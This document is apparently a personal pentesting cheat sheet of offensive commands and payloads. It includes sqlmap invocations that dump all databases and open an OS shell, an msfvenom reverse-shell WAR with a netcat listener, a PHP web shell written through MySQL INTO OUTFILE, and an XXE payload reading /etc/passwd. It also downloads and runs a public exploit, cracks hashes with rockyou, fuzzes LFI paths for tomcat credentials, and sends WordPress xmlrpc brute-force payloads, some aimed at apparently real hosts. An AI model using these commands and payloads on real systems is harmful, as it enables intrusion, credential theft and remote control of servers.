## SQLMAP

sqlmap -u "http://10.17.32.212/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]

ghauri -u "http://www.abc.in/ErrorPage.aspx?enc=+AenvvvnbvntfgBByOwZTA==" --batch --dbs --level 3

python sqlmap .py -r Request.txt -p param --ignore-code 401 --level 5 --risk 2 --batch --os-shell  (for shell)

sqlmap -r request3.txt -p username,password --ignore-code 401 --proxy http://127.0.0.1:8080

sqlmap -u http://testsite.com/page.php?id=1 --dbs

sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all

sqlmap -r request.txt --dbs --risk=3 --level=5    (To scan all parameters in the request)


#### If you found a blind sql or any sql then use this command:

sqlmap -r request3.txt -p username,password --ignore-code 401 --proxy http://127.0.0.1:8080 --dbs

#### Then if database are listed browse to them and list down tables:

sqlmap -r request3.txt -p username,password --ignore-code 401 --proxy http://127.0.0.1:8080 -D databasename --tables

#### Another set of commands

sqlmap -r request3.txt -p column_code,type  --ignore-code 401 --level 5 --risk 3 --force-ssl --mobile --dbs


### Windows command SQLmap

python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p username,emailid --ignore-code 401 --level 5 --risk 3 --force-ssl --mobile --batch --dbs 

python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p UserId,login_type --ignore-code 401 --proxy http://127.0.0.1:8080 -D users --tables

#### Using tamper script
python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p rowID --ignore-code 401 --level 5 --batch --tamper space2plus,space2comment,charencode

#### To browse through directories we use
python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p title,content,author --level 2 --ignore-code 401 -D abcde --tables

#### To browse through tables we use
python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p email --level 2 --ignore-code 401 -D abcde -T user_details --column

#### To dump the data
python sqlmap.py  -r C:\Users\Dell\Desktop\request3.txt -p email --level 2 --ignore-code 401 -D abcde -T user_details --column --batch --dump

### RCE (create exploit war file)

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.6.29 LPORT=9999 -f war > shell.war 

nc -nlvp 9999    

### Shell upload using mysql (If web)
```
SELECT "<html><body><?php echo system($_GET['command']); ?></body></html>" into outfile "/usr/share/tomcat9-root/"
```

### Exploit SQLi along with cracking pass

python 46635.py -u http://10.10.146.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt

### XXE Exploit
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
   <!ELEMENT data ANY >
   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
<comment>
  <name>&name;</name>
  <author>DD</author>
  <com>Just Articles</com>
</comment>
```

## Directly Download exploit and run it

wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py

python2.7 joomblah.py http://10.10.91.172

## Identify Hashes

hashes.com

nano hash

cat hash

#### Breaking Hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash

## Open .bak Files (SQLite)

wget http://10.10.74.246/custom/js/users.bak

sqlitebrowser users.bak

## Directory Bruteforce Tools

gobuster dir -u https://google.in/abc/documents -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt (dir enum)
          
          gobuster dns -u google.com  (for finding subdomains)

dirsearch -u https://google.in/abc/ -w /usr/share/wordlists/rockyou.txt

####  403 Bypass tool

bash 403-bypass.sh -u https://abc.in/.htaccess --exploit

#### Fuzzing using LFI

wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://49.186.149.89:8081/sh/download?file=../../../../../../../../../../../opt/tomcat/FUZZ/tomcat-users.xml | grep -v "0 L"

wfuzz -u http://10.10.136.136:5000/api/v2/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404  (change v2 to v1 or vice versa to find hidden injectable endpoints)

## WordPress Pentesting

```
/wp-json/wp/v2/users
/xmlrpc.php
```
List all methods
```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
Brute Force Attack
```
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
XSPA Attack

```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```

### WPScan Commands

wpscan –url IP_ADDRESS_OF_WEBSITE

wpscan –url IP_ADDRESS_OF_WEBSITE -e u  (enumerate users)

wpscan –url IP_ADDRESS_OF_WEBSITE -U USER_NAME -P /usr/share/wordlists/rockyou.txt (BFA)





